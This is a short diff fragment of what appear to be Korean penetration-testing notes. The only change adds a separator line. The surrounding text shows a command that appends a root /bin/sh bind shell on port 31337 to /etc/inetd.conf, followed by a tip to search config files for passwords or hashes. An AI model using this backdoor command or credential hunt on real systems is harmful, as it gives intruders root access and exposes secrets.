@@ -9,6 +9,7 @@ echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf"
 
 - 31337번 포트로 바인드 셸 연결
 
+---
 
 - config 파일을 먼저 find로 모두 찾아본 뒤에 패스워드 혹은 해시가 적혀 있는지 확인
 
